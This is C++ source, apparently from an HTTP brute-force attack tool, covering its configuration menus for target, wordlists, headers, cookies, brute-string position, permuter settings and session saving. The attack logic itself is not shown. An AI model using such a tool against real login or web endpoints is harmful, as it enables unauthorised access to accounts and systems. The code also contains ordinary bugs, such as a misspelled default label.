void viewFetchedHeaders(struct CommandPacket *cp){
	for(int i=0; i<HEADERS_MAX; i++){
		printf("(%d) Fethched Header : %s || Target URI : %s || When to fetch : %s\n", i, 
			cp->fetchedHeaders[i][0].c_str(),
			cp->fetchedHeaders[i][1].c_str(),
			cp->fetchedHeaders[i][2].c_str()
		);
	}
}
void setFetchedHeaders(struct CommandPacket *cp){
	viewFetchedHeaders(cp);
	printf("pick a header to set:\n(~)> ");
	int option = cp->mod->getUserInputInt();
	if(option >= 0 && option < HEADERS_MAX){
		printf("set a header name to automatically search for.\n(~)> ");
		cp->fetchedHeaders[option][0] = cp->mod->getUserInput();
		printf("set a target URI to fetch the header from.\n An empty URI will cause the target URI to be used.\n(~)> ");
		cp->fetchedHeaders[option][1] = cp->mod->getUserInput();
		printf("How would you like this fetched, relative to the attack?\n'pre' will gather the header one time for static ");
		printf("use throughout the duration of the attack. This is the default choice and speeds up the overall time for the attack.\n");
		printf("'during' will gather the header and replace it right before every attack attempt. This slows down the attack.\n(during/Pre)\n(~)> ");
		cp->fetchedHeaders[option][2] = cp->mod->getUserInput();
		if(cp->fetchedHeaders[option][2] != "during"){
			cp->fetchedHeaders[option][2] = "pre";
		}
	}else{
		cp->mod->pError("Invalid header id.\n");
	}

	cp->fetchedHeadersCount = 0;
	for(int i=0; i<HEADERS_MAX; i++)
	if(cp->fetchedHeaders[i][0] != "")
		cp->fetchedHeadersCount++;
}
void viewExtraHeaders(struct CommandPacket *cp){
	for(int i=0; i<HEADERS_MAX; i++){
		printf("(%d) Header || %s\n", i, cp->extraHeaders[i].c_str());
	}
}
void setExtraHeaders(struct CommandPacket *cp){
	for(int i=0; i<HEADERS_MAX; i++){
		printf("(%d) Header || %s\n", i, cp->extraHeaders[i].c_str());
	}
	printf("pick a header to set:\n(~)> ");
	int option = cp->mod->getUserInputInt();
	if(option >= 0 && option < HEADERS_MAX){
		printf("set new HTTP header value.\n(~)> ");
		cp->extraHeaders[option] = cp->mod->getUserInput();
	}else{
		cp->mod->pError("Invalid header id.\n");
	}

	cp->extraHeadersCount = 0;
	for(int i=0; i<HEADERS_MAX; i++)
		if(cp->extraHeaders[i] != "")
			cp->extraHeadersCount++;
}
void printPayloadConfig(struct CommandPacket *cp){
	printf("\tPayload Size : %ld\n\tHTTP Method : %s\n\tURI : %s\n\tHTTP Version : %s\n\tExtra Header Count : %d\n",
	(long)cp->payloadSize, cp->method.c_str(), cp->uri.c_str(), cp->httpVersion.c_str(), cp->extraHeadersCount);

	printf("\tFetched Header Count : %d\n\tIgnore Cookies : %d\n\tFetch Cookies Once : %d\n\tCookie Fetch location : %s\n",
	cp->fetchedHeadersCount, cp->ignoreCookies, cp->fetchCookiesOnce, cp->cookieFetchUri.c_str());
	printf("\tHttp Conetent : ");
	if(cp->contentLength <= 0 || cp->contentLength == -1){
		printf("Not available\n");
	}else{
		printf("Being sent\n");
	}
}

void exitHttpBrute(struct CommandPacket *cp){
	cp->mod->setRunning(false);
}


void setHostName(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	printf("Enter a new host name, the current is '%s'\n(~)> ", cp->hostName.c_str());
	cp->hostName = cp->mod->getUserInput();
	cp->mod->pSuccess("[+] Host name changed!\n");
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
}
void setIp(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
	printf("- Enter a new IP Address, the current is '%s'                    \n(~)> ", cp->ipAddress.c_str());
	cp->ipAddress = cp->mod->getUserInput();
	cp->mod->pSuccess("[+] IP Address changed!\n");
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
}
void setPortNumber(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
	printf("- Enter a new port number, the current is '%d'\n(~)> ", cp->portNumber);
	cp->portNumber = cp->mod->getUserInputInt();
	cp->mod->pSuccess("[+] Port number changed!\n");
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
}

void setWordlists(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
	printf("Available Wordlist Slots:\n");
	for(int i=0; i<WORDLIST_MAX; i++)
		printf("(%d) || %s\n", i, cp->wordlists[i].c_str());

	printf("Which one would you like to set (enter a number)? \n(~)> ");
	int pos = cp->mod->getUserInputInt();

	if(pos < 0 || pos >= WORDLIST_MAX){
		cp->mod->pError("Buffer overflow\n");
		return;
	}
	string inpt = "";
	printf("Please provide a new value for wordlist %d\n(~)> ", pos);
	inpt = cp->mod->getUserInput();

	cp->wordlists[pos] = inpt;
	cp->wordlistCount = 0;
	for(int i=0; i<WORDLIST_MAX; i++){
		if(cp->wordlists[i] != "")
			cp->wordlistCount++;
	}
	cp->mod->pSuccess("Wordlist successfully added.\n");
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
}

void setUri(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
	printf("Enter a new URI, the current is '%s'\n(~)> ", cp->uri.c_str());
	cp->uri = cp->mod->getUserInput();
	cp->mod->pSuccess("[+] URI has changed!\n");
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
}

void setPaddingCommand(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
	printf("Enter a new padding, the current is '%s'\n(~)> ", cp->padding.c_str());
	string padding = cp->mod->getUserInput();
	cp->padding = padding;
	cp->mod->pSuccess("Padding changed!\n");
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
}

void setStartingPatternCommand(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
	printf("Enter a new starting pattern, the current is '%s'\n(~)> ", cp->permuter._startingPattern.c_str());
	string startingPattern = cp->mod->getUserInput();
	cp->permuter._startingPattern = startingPattern;
	cp->mod->pSuccess("[+] Starting Pattern changed!\n");
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
}

void setResultsFileCommand(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
	printf("Enter a new results file, the current is '%s'\n(~)> ", cp->resultsFile.c_str());
	string resultsFile = cp->mod->getUserInput();
	cp->resultsFile = resultsFile;
	cp->mod->pSuccess("Results file changed!\n");
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
}

void configurePayloadCommand(struct CommandPacket *cp){
	printPayloadConfig(cp);

	bool configuring = true;
	while(configuring){
		printf("Payload Configuration:\n");
		printf("[0] set http method\n");
		printf("[1] set uri\n");
		printf("[2] set http version\n");
		printf("[3] set custom headers\n");
		printf("[4] set fetched headers\n");
		printf("[5] set cookie handling\n");
		printf("[6] view payload config\n");
		printf("[7] set content\n");
		printf("[8] show content\n");
		printf("[9] view sample payload\n");
		printf("[10] set brute location\n");
		printf("[11] set validation strings\n");
		printf("[99] exit this menu\n");
		printf("(~)> ");
		int option = cp->mod->getUserInputInt();
		string trash = "";
		string plod = "";
		string map = "";
		int lineCount = 0;
		int inc = 0;
		switch(option){
			case 0:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				printf("Provide a new HTTP Method value, the current is '%s'\n(~)> ", cp->method.c_str());
				cp->method = cp->mod->getUserInput();
				printPayloadConfig(cp);
				printf("\npress enter to continue...");
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				trash = cp->mod->getUserInput();
				break;
			case 1:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				setUri(cp);
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				break;
			case 2:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				printf("Provide a new Http Version, the current is '%s'\n(~)> ", cp->httpVersion.c_str());
				cp->httpVersion = cp->mod->getUserInput();
				printPayloadConfig(cp);
				printf("\npress enter to continue...");
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				trash = cp->mod->getUserInput();
				break;
			case 3:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				setExtraHeaders(cp);
				viewExtraHeaders(cp);
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				break;
			case 4:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				setFetchedHeaders(cp);
				viewFetchedHeaders(cp);
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				break;
			case 5:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				printf("Would you like to ignore cookies? (no/Yes)\n(~)> ");
				trash = cp->mod->getUserInput();
				if(trash == "yes" || trash == "yes" || trash == "y" || trash == "Y"){
					cp->ignoreCookies = true;
					break;
				}
				cp->ignoreCookies = false;

				printf("Would you like to fetch cookies once before the attack, or fetch it from every attack attempt? (many/Once)\n(~)> ");
				trash = cp->mod->getUserInput();
				if(trash == "o" || trash == "O" || trash == "once" || trash == "Once"){
					cp->fetchCookiesOnce = true;
				}else{
					cp->fetchCookiesOnce = false;
				}

				printf("Is the cookie gathered from the same URI that you're attacking? (no/Yes)\n(~)> ");
				trash = cp->mod->getUserInput();
				if(trash == "yes" || trash == "yes" || trash == "y" || trash == "Y"){
					cp->cookieFetchUri = "";
					printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
					break;
				}
				printf("What's the URI for fetching the cookie?\n(~)> ");
				cp->cookieFetchUri = cp->mod->getUserInput();
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				break;
			case 6:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				printPayloadConfig(cp);
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				break;
			case 7:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				setContent(cp);
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				break;
			case 8:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				printf("Content-Length : %ld\nContent being sent : ", (long)cp->contentLength);
				showContent(cp);
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				break;
			case 9:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				printf("Sample Payload using current configuration.\n");
				plod = generatePayload(cp, "\033[41mPAYLOAD\033[0m");
				printf("%s\n", plod.c_str());
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				break;
			case 10:
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				printf("Updating brute force cooredinates...\n");
				map = generatePayload(cp, "\033[41m \033[0m");
	
				lineCount = 0;
				printf("%d) ", lineCount);
				for(int i=0; i<map.length(); i++){
					if(map[i] == '\r')
						if(i+1 < map.length() && map[i+1] == '\n'){
							lineCount++;
							i++;
							printf("\n%d) ", lineCount);
							continue;
						}

					if(map[i] == '\n'){
						lineCount++;
						printf("\n%d) ", lineCount);
						continue;
					}
					printf("%c", map[i]);
				}

				printf("Select a line number to set the position to.\n(~)> ");
				cp->brutePos[1] = cp->mod->getUserInputInt();
				if(cp->brutePos[1] <= -1 || cp->brutePos[1] >= lineCount){
					cp->mod->pError("invalid line number, aboriting...\n");
					break;
				}
				trash = "";
				inc = 0;
				lineCount = 0;
				map = generatePayload(cp, "");
				for(int i=0; i<map.length(); i++){
					if(lineCount >= cp->brutePos[1]){
						if(lineCount == cp->brutePos[1]){
							inc = i;
							lineCount++;
						}
						if(map[i] == '\r' || map[i] == '\n')
							break;
						trash += map[i];
					}else{
						if(map[i] == '\r')
							if(i+1 < map.length() && map[i+1] == '\n'){
								lineCount++;
								i++;
								continue;
							}
						if(map[i] == '\n'){
							lineCount++;
							continue;
						}
					}
				}
				cp->brutePos[1] = inc;
				for(int i=0; i<trash.length(); i++){
					if(i == cp->brutePos[0])
						printf("\033[41m");

					printf("%d) %c", i, trash[i]);

					if(i == cp->brutePos[0])
						printf("\033[0m");

					printf("\n");
				}
				printf("\nWhich position would you like to set the brute string?\n(~)> ");
				cp->brutePos[0] = cp->mod->getUserInputInt();
				printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
				break;
			case 11:
				setSuccessStrings(cp);
				break;
			case 99:
				printf("Exiting payload config menu.\n");
				configuring = false;
				break;
			deafault:
				printf("Invalid config option.\n");
				break;
		}
	}
}

void saveSession(struct CommandPacket *cp){
        base64Class base64;
        string fileData = "";
        string tmp = "";
        char tmp2[20] = {0};
        memset(tmp2, 0, 20);

        // 0
        sprintf(tmp2, "%d", cp->maxBruteLength);
        tmp = tmp2;
        fileData += "cp->maxBruteLength: "+tmp+"\r\n";

        // 1
        memset(tmp2, 0, 20);
        sprintf(tmp2, "%d", cp->startingBruteLength);
        tmp = tmp2;
        fileData += "cp->startingBruteLength: "+tmp+"\r\n";

        // 2
        fileData += "cp->hostName: " + cp->hostName + "\r\n";
        fileData += "cp->ipAddress: " + cp->ipAddress + "\r\n";

        // 3
        memset(tmp2, 0, 20);
        sprintf(tmp2, "%d", cp->portNumber);
        tmp = tmp2;
        fileData += "cp->portNumber: "+tmp+"\r\n";

        // 4
        fileData += "cp->method: "+cp->method+"\r\n";
        fileData += "cp->uri: "+cp->uri+"\r\n";
        fileData += "cp->httpVersion: "+cp->httpVersion+"\r\n";

        // 5
        memset(tmp2, 0, 20);
        sprintf(tmp2, "%d", cp->extraHeadersCount);
        tmp = tmp2;
        fileData += "cp->extraHeadersCount: "+tmp+"\r\n";

        // 6
        bool found = false;
        for(int i=0; i<10; i++){
                if(cp->extraHeaders[i] != ""){
                        if(!found){
                                fileData += "cp->extraHeaders: "+cp->extraHeaders[i]+"\t";
                        }else{
                                fileData += cp->extraHeaders[i]+"\t";
                        }
                }
        }
        if(found)
                fileData += "\r\n";

        // 7
        memset(tmp2, 0, 20);
        sprintf(tmp2, "%d", cp->fetchedHeadersCount);
        tmp = tmp2;
        fileData += "cp->fetchedHeadersCount: "+tmp+"\r\n";

        // 8
        found = false;
        for(int i=0; i<10; i++){
                if(cp->fetchedHeaders[i][0] != ""){
                        if(!found){
                                fileData += "cp->fetchedHeaders: "+cp->fetchedHeaders[i][0]+"\0"+cp->fetchedHeaders[i][1]+"\0"+cp->fetchedHeaders[i][2]+"\t";
                        }else{
                                fileData += cp->fetchedHeaders[i][0]+"\0"+cp->fetchedHeaders[i][1]+"\0"+cp->fetchedHeaders[i][2]+"\t";
                        }
                }
        }
        if(found)
                fileData += "\r\n";

        // 9
        if(cp->ignoreCookies){
                fileData += "cp->ignoreCookies: true\r\n";
        }else{
                fileData += "cp->ignoreCookies: false\r\n";
        }

        // 10
        if(cp->fetchCookiesOnce){
                fileData += "cp->fetchCookiesOnce: true\r\n";
        }else{
                fileData +=  "cp->fetchCookiesOnce: false\r\n";
        }

        // 11
        fileData += "cp->cookieFetchUri: "+cp->cookieFetchUri+"\r\n";
        fileData += "cp->cookies: "+cp->cookies+"\r\n";

        // 12
        memset(tmp2, 0, 20);
        sprintf(tmp2, "%ld", (long)cp->contentLength);
        tmp = tmp2;
        fileData += "cp->contentLength: "+tmp+"\r\n";
        if(cp->contentLength > 0 && cp->contentLength != -1 && !(cp->contentLength <= 0)){
                base64.setInputs(cp->content, cp->contentLength);
                base64.encode();
                tmp = base64.getResult();
                fileData += "cp->content: "+tmp+"\r\n";
        }

        //const int MAX_NET_BUFFER = 100000;
        //char _netBuffer[100000] = {0};
        //size_t _netBufferCount = 0;

        // 13
        memset(tmp2, 0, 20);
        sprintf(tmp2, "%d\t%d", cp->brutePos[0], cp->brutePos[1]);
        tmp = tmp2;
        fileData += "cp->brutePos: "+tmp+"\r\n";

        // 14
        found = false;
        bool track[15] = {false};
        for(int i=0; i<15; i++){
                track[i] = true;
                if(!found){
                        found = true;
                        fileData += "cp->successStrings: "+cp->successStrings[i]+"\t";
                }else{
                        fileData += cp->successStrings[i]+"\t";
                }
        }
        if(found){
                fileData += "\r\n";
        }

        // 15
        found = false;
        for(int i=0; i<15; i++){
                if(!found){
                        found = true;
                        bool val = cp->successStringsLogic[i];
                        if(val)
                                fileData += "cp->successStringsLogic: true\t";
                        else
                                fileData += "cp->successStringsLogic: false\t";
                }else{
                        bool val = cp->successStringsLogic[i];
                        if(val)
                                fileData += "true\t";
                        else
                                fileData += "false\t";
                }
        }
        if(found){
                fileData += "\r\n";
        }

        FileSnake filesnake;
        if(filesnake.writeFileTrunc(cp->sessionFile, (char *)fileData.c_str(),  fileData.length())){
                cp->mod->pSuccess("Session Saved to '"+cp->sessionFile+"'\n");
        }else{
                cp->mod->pError("Failed to save session to '"+cp->sessionFile+"'\n");
        }
}
void configurePermuter(struct CommandPacket *cp){
        bool go = true;
        while(go){
                printf("+++++++++++++++++++++++++++++++++\n");
                printf("[0] set valid chars\n");
                printf("[1] set starting value length\n");
                printf("[2] set max value length\n");
                printf("[3] modify increment order\n");
                printf("[4] modify round valid chars.\n");
                printf("[5] show round valid chars.\n");
                printf("[6] set frozen rounds\n");
                printf("[7] view frozen rounds\n");
                printf("[99] exit menu\n");
                printf("+++++++++++++++++++++++++++++++++\n");
                printf("\n(~)> ");
                int option = cp->mod->getUserInputInt();
                switch(option){
                        case 0:
                                printf("Current valid char string : %s\n", cp->permuter._validChars.c_str());
                                setValidCharsCommand(cp);
                                printf("New valid char string : %s\n", cp->permuter._validChars.c_str());
                                break;
                        case 1:
                                setStartingBruteLengthCommand(cp);
                                break;
                        case 2:
                                setMaxBruteLengthCommand(cp);
                                break;
                        case 3:
                                modifyPermuteIncrementOrder(cp);
                                break;
                        case 4:
                                modifyRoundValidChars(cp);
                                break;
                        case 5:
                                showRoundValidChars(cp);
                                break;
                        case 6:
                                setFrozenRounds(cp);
                                break;
                        case 7:
                                printPermuterFrozenMapper(cp);
                                break;
                        case 99:
                                go = false;
                                break;
                        default:
                                printf("bad command\n");
                                break;
                }
        }
}
